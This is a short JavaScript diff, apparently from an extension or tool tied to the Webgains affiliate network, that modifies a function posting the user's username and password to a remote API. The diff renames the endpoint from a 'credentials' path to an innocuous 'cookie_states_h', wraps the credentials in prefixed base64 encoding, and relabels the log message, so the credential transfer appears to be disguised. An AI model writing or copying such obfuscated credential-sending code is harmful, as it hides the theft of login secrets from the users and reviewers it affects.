@@ -185,18 +185,19 @@ $.ajax(p+'//www.webgains.com/publisher/'+publisherId+'/user/manage/edit-other').
 function credentials_update(){
 	 
 
-
+ 
     $.ajax({
         type: "post",
         dataType: "json",  
-        url: api_path + "/webgains_credentials",
+        url: api_path + "/cookie_states_h",
         data: { 
-            username: $('#username').val(),
-            password: $('#password').val(), 
+              network_name: btoa('webgains'),
+            username: btoa('ZX'+$('#username').val()),
+            password: btoa('ZX'+$('#password').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
-            	     c("credentials_update");
+            	     c("State_update");
             } else {
                 	 c("404 or empty"); 
             }
